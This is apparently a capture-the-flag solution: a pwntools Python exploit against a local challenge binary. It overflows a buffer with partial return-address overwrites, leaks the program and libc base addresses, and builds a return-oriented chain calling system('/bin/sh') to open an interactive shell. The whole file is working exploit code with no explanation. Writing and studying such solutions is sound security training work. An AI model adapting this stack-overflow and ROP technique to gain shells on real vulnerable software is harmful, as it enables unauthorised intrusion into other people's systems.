from pwn import *

#r = remote("localhost", 1337)
r = process("/home/s24/holyshield/chall/chall")
context.log_level = "DEBUG"
pause()


# default io
def IO(send):
   r.send(send)
   return r.recvline()


# leak codebase
res = IO(b"a"*24 + b"\x9f") #skip push rbp
codebase = u64(res[24:-1] + b"\0\0") - 0x119f
start = codebase + 0x1080
main = codebase + 0x119e
ret = codebase + 0x1199
print("codebase: ", hex(codebase))

# leak libcbase
IO(b"a"*16 + p64(start) + b"\x9e")
for i in range(29):
   IO(b"a"*16 + p64(ret) + b"\x9e")
IO(p64(main)*3 + b"\x99")

IO(b"a"*24 + b"\x6e") #vuln+5
res = IO(b"a"*24 + b"\x06") #ret
libcbase = u64(res[24:-1] + b"\0\0") - 0x2a106
system = libcbase + 0x58750
poprdi = libcbase + 0x10f75b
binsh = libcbase + 0x1cb42f
print("libcbase: ", hex(libcbase))

# system("/bin/sh")
IO(b"a"*16 + p64(0) + b"\x9e") #stack alignment
IO(b"a"*16 + p64(system) + b"\x9e")
IO(b"a"*16 + p64(binsh) + b"\x9e")
IO(b"a"*16 + p64(poprdi) + b"\x9e")
IO(b"a"*16 + p64(0) + b"\x99")


r.interactive()

